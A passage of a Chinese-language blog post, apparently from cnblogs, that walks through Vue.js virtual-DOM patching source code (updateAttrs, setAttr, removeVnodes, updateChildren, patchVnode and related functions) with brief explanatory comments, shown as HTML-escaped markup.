updateDirectives(oldVnode, vnode)&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;name-and-value&quot;&gt;&lt;span class=&quot;name object-properties-section-dimmed&quot;&gt;length: &lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;name-and-value&quot;&gt;&lt;span class=&quot;name object-properties-section-dimmed&quot;&gt;__proto__: &lt;span class=&quot;object-value-array value&quot;&gt;Array(0)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;span class=&quot;name-and-value&quot;&gt;&lt;span class=&quot;name&quot;&gt; &lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;span&gt; &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;那么函数调用后发生了什么呢？cbs.create是一个函数作为成员的数组，遍历每个成员调用，我们以其中一个成员函数来看看发生了什么，updateAttrs(emptyNode,vnode)。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; invokeCreateHooks (vnode, insertedVnodeQueue) {
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (let i = 0; i &amp;lt; cbs.create.length; ++&lt;span&gt;i) {
      cbs.create[i](emptyNode, vnode)
    }
    i &lt;/span&gt;= vnode.data.hook &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Reuse variable&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(i)) {
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(i.create)) i.create(emptyNode, vnode)
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(i.insert)) insertedVnodeQueue.push(vnode)
    }
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们找到updateAttrs方法。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; updateAttrs (oldVnode, vnode) {
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; opts =&lt;span&gt; vnode.componentOptions;
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isDef(opts) &amp;amp;&amp;amp; opts.Ctor.options.inheritAttrs === &lt;span&gt;false&lt;/span&gt;&lt;span&gt;) {
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;
    }
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isUndef(oldVnode.data.attrs) &amp;amp;&amp;amp;&lt;span&gt; isUndef(vnode.data.attrs)) {
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;
    }
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt;&lt;span&gt; key, cur, old;
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; elm =&lt;span&gt; vnode.elm;
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; oldAttrs = oldVnode.data.attrs ||&lt;span&gt; {};
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; attrs = vnode.data.attrs ||&lt;span&gt; {};
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; clone observed objects, as the user probably wants to mutate it&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(attrs.__ob__)) {
      attrs &lt;/span&gt;= vnode.data.attrs =&lt;span&gt; extend({}, attrs);
    }
     &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;核心代码，setAttr设置新节点的属性&lt;/span&gt;
    &lt;span&gt;for&lt;/span&gt; (key &lt;span&gt;in&lt;/span&gt;&lt;span&gt; attrs) {
      cur &lt;/span&gt;=&lt;span&gt; attrs[key];
      old &lt;/span&gt;=&lt;span&gt; oldAttrs[key];
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (old !==&lt;span&gt; cur) {
        setAttr(elm, key, cur);
      }
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; #4391: in IE9, setting type can reset value for input[type=radio]&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; #6666: IE/Edge forces progress value down to 1 before setting a max&lt;/span&gt;
    &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; istanbul ignore if &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; ((isIE || isEdge) &amp;amp;&amp;amp; attrs.value !==&lt;span&gt; oldAttrs.value) {
      setAttr(elm, &lt;/span&gt;'value'&lt;span&gt;, attrs.value);
    }
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;核心代码，删除纠结点的属性&lt;/span&gt;
    &lt;span&gt;for&lt;/span&gt; (key &lt;span&gt;in&lt;/span&gt;&lt;span&gt; oldAttrs) {
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isUndef(attrs[key])) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isXlink(key)) {
          elm.removeAttributeNS(xlinkNS, getXlinkProp(key));
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;isEnumeratedAttr(key)) {
          elm.removeAttribute(key);
        }
      }
    }
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('6c6369be-2d7c-4570-916f-682879d91c7b')&quot; readability=&quot;39&quot;&gt;&lt;img id=&quot;code_img_closed_6c6369be-2d7c-4570-916f-682879d91c7b&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_6c6369be-2d7c-4570-916f-682879d91c7b&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('6c6369be-2d7c-4570-916f-682879d91c7b',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_6c6369be-2d7c-4570-916f-682879d91c7b&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;73&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; setAttr (el, key, value) {
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (el.tagName.indexOf('-') &amp;gt; -1&lt;span&gt;) {
      baseSetAttr(el, key, value);
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isBooleanAttr(key)) {
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; set attribute for blank value&lt;/span&gt;
      &lt;span&gt;//&lt;/span&gt;&lt;span&gt; e.g. &amp;lt;option disabled&amp;gt;Select one&amp;lt;/option&amp;gt;&lt;/span&gt;
      &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isFalsyAttrValue(value)) {
        el.removeAttribute(key);
      } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; technically allowfullscreen is a boolean attribute for &amp;lt;iframe&amp;gt;,&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; but Flash expects a value of &quot;true&quot; when used on &amp;lt;embed&amp;gt; tag&lt;/span&gt;
        value = key === 'allowfullscreen' &amp;amp;&amp;amp; el.tagName === 'EMBED'
          ? 'true'&lt;span&gt;
          : key;
        el.setAttribute(key, value);
      }
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isEnumeratedAttr(key)) {
      el.setAttribute(key, convertEnumeratedValue(key, value));
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isXlink(key)) {
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isFalsyAttrValue(value)) {
        el.removeAttributeNS(xlinkNS, getXlinkProp(key));
      } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        el.setAttributeNS(xlinkNS, key, value);
      }
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
      baseSetAttr(el, key, value);
    }
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;setAttr&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; baseSetAttr (el, key, value) {
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isFalsyAttrValue(value)) {
      el.removeAttribute(key);
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; #7138: IE10 &amp;amp; 11 fires input event when setting placeholder on&lt;/span&gt;
      &lt;span&gt;//&lt;/span&gt;&lt;span&gt; &amp;lt;textarea&amp;gt;... block the first input event and remove the blocker&lt;/span&gt;
      &lt;span&gt;//&lt;/span&gt;&lt;span&gt; immediately.&lt;/span&gt;
      &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; istanbul ignore if &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
      &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (
        isIE &lt;/span&gt;&amp;amp;&amp;amp; !isIE9 &amp;amp;&amp;amp;&lt;span&gt;
        el.tagName &lt;/span&gt;=== 'TEXTAREA' &amp;amp;&amp;amp;&lt;span&gt;
        key &lt;/span&gt;=== 'placeholder' &amp;amp;&amp;amp; value !== '' &amp;amp;&amp;amp; !&lt;span&gt;el.__ieph
      ) {
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; blocker = &lt;span&gt;function&lt;/span&gt;&lt;span&gt; (e) {
          e.stopImmediatePropagation();
          el.removeEventListener(&lt;/span&gt;'input'&lt;span&gt;, blocker);
        };
        el.addEventListener(&lt;/span&gt;'input'&lt;span&gt;, blocker);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; $flow-disable-line&lt;/span&gt;
        el.__ieph = &lt;span&gt;true&lt;/span&gt;; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; IE placeholder patched &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
      }
      el.setAttribute(key, value);
    }
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;pre&gt;
然后就是data.hook有没有定义。要是定义了，那就调用create或者insert方法。&lt;br/&gt;setScope
&lt;/pre&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; setScope (vnode) {
    let i
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isDef(i =&lt;span&gt; vnode.fnScopeId)) {
      nodeOps.setStyleScope(vnode.elm, i)
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
      let ancestor &lt;/span&gt;=&lt;span&gt; vnode
      &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; (ancestor) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isDef(i = ancestor.context) &amp;amp;&amp;amp; isDef(i =&lt;span&gt; i.$options._scopeId)) {
          nodeOps.setStyleScope(vnode.elm, i)
        }
        ancestor &lt;/span&gt;=&lt;span&gt; ancestor.parent
      }
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; for slot content they should also get the scopeId from the host instance.&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (isDef(i = activeInstance) &amp;amp;&amp;amp;&lt;span&gt;
      i &lt;/span&gt;!== vnode.context &amp;amp;&amp;amp;&lt;span&gt;
      i &lt;/span&gt;!== vnode.fnContext &amp;amp;&amp;amp;&lt;span&gt;
      isDef(i &lt;/span&gt;=&lt;span&gt; i.$options._scopeId)
    ) {
      nodeOps.setStyleScope(vnode.elm, i)
    }
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;addVnodes&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;45&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;function&lt;/span&gt;&lt;span&gt; addVnodes (parentElm, refElm, vnodes, startIdx, endIdx, insertedVnodeQueue) {
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (; startIdx &amp;lt;= endIdx; ++&lt;span&gt;startIdx) {
      createElm(vnodes[startIdx], insertedVnodeQueue, parentElm, refElm, &lt;/span&gt;&lt;span&gt;false&lt;/span&gt;&lt;span&gt;, vnodes, startIdx)
    }
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;invokeDestroyHook&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; invokeDestroyHook (vnode) {
    let i, j
    const data &lt;/span&gt;=&lt;span&gt; vnode.data
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(data)) {
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isDef(i = data.hook) &amp;amp;&amp;amp; isDef(i =&lt;span&gt; i.destroy)) i(vnode)
      &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (i = 0; i &amp;lt; cbs.destroy.length; ++&lt;span&gt;i) cbs.destroy[i](vnode)
    }
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isDef(i =&lt;span&gt; vnode.children)) {
      &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (j = 0; j &amp;lt; vnode.children.length; ++&lt;span&gt;j) {
        invokeDestroyHook(vnode.children[j])
      }
    }
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;destroy调用实际上是调用的function destory以及unbindDirectives 。那么功能是销毁咯。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
destroy: Array(2&lt;span&gt;)
&lt;/span&gt;0&lt;span&gt;: ƒ destroy(vnode)
&lt;/span&gt;1: ƒ unbindDirectives(vnode)
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
destroy: &lt;span&gt;function&lt;/span&gt;&lt;span&gt; destroy (vnode) {
      &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; componentInstance =&lt;span&gt; vnode.componentInstance;
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;componentInstance._isDestroyed) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;vnode.data.keepAlive) {
          componentInstance.$destroy();
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
          deactivateChildComponent(componentInstance, &lt;/span&gt;&lt;span&gt;true&lt;/span&gt; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; direct &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;);
        }
      }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
 destroy: &lt;span&gt;function&lt;/span&gt;&lt;span&gt; unbindDirectives (vnode) {
      updateDirectives(vnode, emptyNode);
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;removeVnodes删除vnode做了哪些事情，删除hook，删除元素。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; removeVnodes (parentElm, vnodes, startIdx, endIdx) {
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (; startIdx &amp;lt;= endIdx; ++&lt;span&gt;startIdx) {
      const ch &lt;/span&gt;=&lt;span&gt; vnodes[startIdx]
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(ch)) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(ch.tag)) {
          removeAndInvokeRemoveHook(ch)
          invokeDestroyHook(ch)
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; { &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Text node&lt;/span&gt;
&lt;span&gt;          removeNode(ch.elm)
        }
      }
    }
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;removeNode的原生方法其实就是removeChild。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; removeNode (el) {
      &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; parent =&lt;span&gt; nodeOps.parentNode(el);
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; element may have already been removed due to v-html / v-text&lt;/span&gt;
      &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(parent)) {
        nodeOps.removeChild(parent, el);
      }
    }&lt;br/&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;rm一开始为undefined，通过 &lt;span class=&quot;cnblogs_code&quot;&gt;rm = createRmCb(vnode.elm, listeners)&lt;/span&gt; 创建了remove函数。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200326132339052-412853074.png&quot; alt=&quot;&quot; width=&quot;389&quot; height=&quot;170&quot;/&gt;&lt;/p&gt;


&lt;p&gt; 核心代码是 &lt;span class=&quot;cnblogs_code&quot;&gt;cbs.remove[i](vnode, rm)&lt;/span&gt; 其实就回到了remove函数这里。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; remove () {
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (--remove.listeners === 0&lt;span&gt;) {
        removeNode(childElm)
      }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;updateChildren&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;98&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; updateChildren (parentElm, oldCh, newCh, insertedVnodeQueue, removeOnly) {
    let oldStartIdx &lt;/span&gt;= 0&lt;span&gt;
    let newStartIdx &lt;/span&gt;= 0&lt;span&gt;
    let oldEndIdx &lt;/span&gt;= oldCh.length - 1&lt;span&gt;
    let oldStartVnode &lt;/span&gt;= oldCh[0&lt;span&gt;]
    let oldEndVnode &lt;/span&gt;=&lt;span&gt; oldCh[oldEndIdx]
    let newEndIdx &lt;/span&gt;= newCh.length - 1&lt;span&gt;
    let newStartVnode &lt;/span&gt;= newCh[0&lt;span&gt;]
    let newEndVnode &lt;/span&gt;=&lt;span&gt; newCh[newEndIdx]
    let oldKeyToIdx, idxInOld, vnodeToMove, refElm

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; removeOnly is a special flag used only by &amp;lt;transition-group&amp;gt;&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; to ensure removed elements stay in correct relative positions&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; during leaving transitions&lt;/span&gt;
    const canMove = !&lt;span&gt;removeOnly

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (process.env.NODE_ENV !== 'production'&lt;span&gt;) {
      checkDuplicateKeys(newCh)
    }

    &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; (oldStartIdx &amp;lt;= oldEndIdx &amp;amp;&amp;amp; newStartIdx &amp;lt;=&lt;span&gt; newEndIdx) {
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isUndef(oldStartVnode)) {
        oldStartVnode &lt;/span&gt;= oldCh[++oldStartIdx] &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Vnode has been moved left&lt;/span&gt;
      } &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isUndef(oldEndVnode)) {
        oldEndVnode &lt;/span&gt;= oldCh[--&lt;span&gt;oldEndIdx]
      } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (sameVnode(oldStartVnode, newStartVnode)) {
        patchVnode(oldStartVnode, newStartVnode, insertedVnodeQueue, newCh, newStartIdx)
        oldStartVnode &lt;/span&gt;= oldCh[++&lt;span&gt;oldStartIdx]
        newStartVnode &lt;/span&gt;= newCh[++&lt;span&gt;newStartIdx]
      } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (sameVnode(oldEndVnode, newEndVnode)) {
        patchVnode(oldEndVnode, newEndVnode, insertedVnodeQueue, newCh, newEndIdx)
        oldEndVnode &lt;/span&gt;= oldCh[--&lt;span&gt;oldEndIdx]
        newEndVnode &lt;/span&gt;= newCh[--&lt;span&gt;newEndIdx]
      } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (sameVnode(oldStartVnode, newEndVnode)) { &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Vnode moved right&lt;/span&gt;
&lt;span&gt;        patchVnode(oldStartVnode, newEndVnode, insertedVnodeQueue, newCh, newEndIdx)
        canMove &lt;/span&gt;&amp;amp;&amp;amp;&lt;span&gt; nodeOps.insertBefore(parentElm, oldStartVnode.elm, nodeOps.nextSibling(oldEndVnode.elm))
        oldStartVnode &lt;/span&gt;= oldCh[++&lt;span&gt;oldStartIdx]
        newEndVnode &lt;/span&gt;= newCh[--&lt;span&gt;newEndIdx]
      } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (sameVnode(oldEndVnode, newStartVnode)) { &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Vnode moved left&lt;/span&gt;
&lt;span&gt;        patchVnode(oldEndVnode, newStartVnode, insertedVnodeQueue, newCh, newStartIdx)
        canMove &lt;/span&gt;&amp;amp;&amp;amp;&lt;span&gt; nodeOps.insertBefore(parentElm, oldEndVnode.elm, oldStartVnode.elm)
        oldEndVnode &lt;/span&gt;= oldCh[--&lt;span&gt;oldEndIdx]
        newStartVnode &lt;/span&gt;= newCh[++&lt;span&gt;newStartIdx]
      } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isUndef(oldKeyToIdx)) oldKeyToIdx =&lt;span&gt; createKeyToOldIdx(oldCh, oldStartIdx, oldEndIdx)
        idxInOld &lt;/span&gt;=&lt;span&gt; isDef(newStartVnode.key)
          &lt;/span&gt;?&lt;span&gt; oldKeyToIdx[newStartVnode.key]
          : findIdxInOld(newStartVnode, oldCh, oldStartIdx, oldEndIdx)
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isUndef(idxInOld)) { &lt;span&gt;//&lt;/span&gt;&lt;span&gt; New element&lt;/span&gt;
          createElm(newStartVnode, insertedVnodeQueue, parentElm, oldStartVnode.elm, &lt;span&gt;false&lt;/span&gt;&lt;span&gt;, newCh, newStartIdx)
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
          vnodeToMove &lt;/span&gt;=&lt;span&gt; oldCh[idxInOld]
          &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (sameVnode(vnodeToMove, newStartVnode)) {
            patchVnode(vnodeToMove, newStartVnode, insertedVnodeQueue, newCh, newStartIdx)
            oldCh[idxInOld] &lt;/span&gt;=&lt;span&gt; undefined
            canMove &lt;/span&gt;&amp;amp;&amp;amp;&lt;span&gt; nodeOps.insertBefore(parentElm, vnodeToMove.elm, oldStartVnode.elm)
          } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; same key but different element. treat as new element&lt;/span&gt;
            createElm(newStartVnode, insertedVnodeQueue, parentElm, oldStartVnode.elm, &lt;span&gt;false&lt;/span&gt;&lt;span&gt;, newCh, newStartIdx)
          }
        }
        newStartVnode &lt;/span&gt;= newCh[++&lt;span&gt;newStartIdx]
      }
    }
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (oldStartIdx &amp;gt;&lt;span&gt; oldEndIdx) {
      refElm &lt;/span&gt;= isUndef(newCh[newEndIdx + 1]) ? &lt;span&gt;null&lt;/span&gt; : newCh[newEndIdx + 1&lt;span&gt;].elm
      addVnodes(parentElm, refElm, newCh, newStartIdx, newEndIdx, insertedVnodeQueue)
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (newStartIdx &amp;gt;&lt;span&gt; newEndIdx) {
      removeVnodes(parentElm, oldCh, oldStartIdx, oldEndIdx)
    }
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;checkDkeys&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; checkDuplicateKeys (children) {
    const seenKeys &lt;/span&gt;=&lt;span&gt; {}
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (let i = 0; i &amp;lt; children.length; i++&lt;span&gt;) {
      const vnode &lt;/span&gt;=&lt;span&gt; children[i]
      const key &lt;/span&gt;=&lt;span&gt; vnode.key
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(key)) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (seenKeys[key]) {
          warn(
            `Duplicate keys detected: &lt;/span&gt;'${key}'&lt;span&gt;. This may cause an update error.`,
            vnode.context
          )
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
          seenKeys[key] &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;
        }
      }
    }
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;findIdsInOld&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; findIdxInOld (node, oldCh, start, end) {
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (let i = start; i &amp;lt; end; i++&lt;span&gt;) {
      const c &lt;/span&gt;=&lt;span&gt; oldCh[i]
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isDef(c) &amp;amp;&amp;amp; sameVnode(node, c)) &lt;span&gt;return&lt;/span&gt;&lt;span&gt; i
    }
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;patchVnode&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;61&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; patchVnode (
    oldVnode,
    vnode,
    insertedVnodeQueue,
    ownerArray,
    index,
    removeOnly
  ) {
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (oldVnode ===&lt;span&gt; vnode) {
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;
    }

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isDef(vnode.elm) &amp;amp;&amp;amp;&lt;span&gt; isDef(ownerArray)) {
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; clone reused vnode&lt;/span&gt;
      vnode = ownerArray[index] =&lt;span&gt; cloneVNode(vnode)
    }

    const elm &lt;/span&gt;= vnode.elm =&lt;span&gt; oldVnode.elm

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isTrue(oldVnode.isAsyncPlaceholder)) {
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(vnode.asyncFactory.resolved)) {
        hydrate(oldVnode.elm, vnode, insertedVnodeQueue)
      } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        vnode.isAsyncPlaceholder &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;
      }
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; reuse element for static trees.&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; note we only do this if the vnode is cloned -&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; if the new node is not cloned it means the render functions have been&lt;/span&gt;
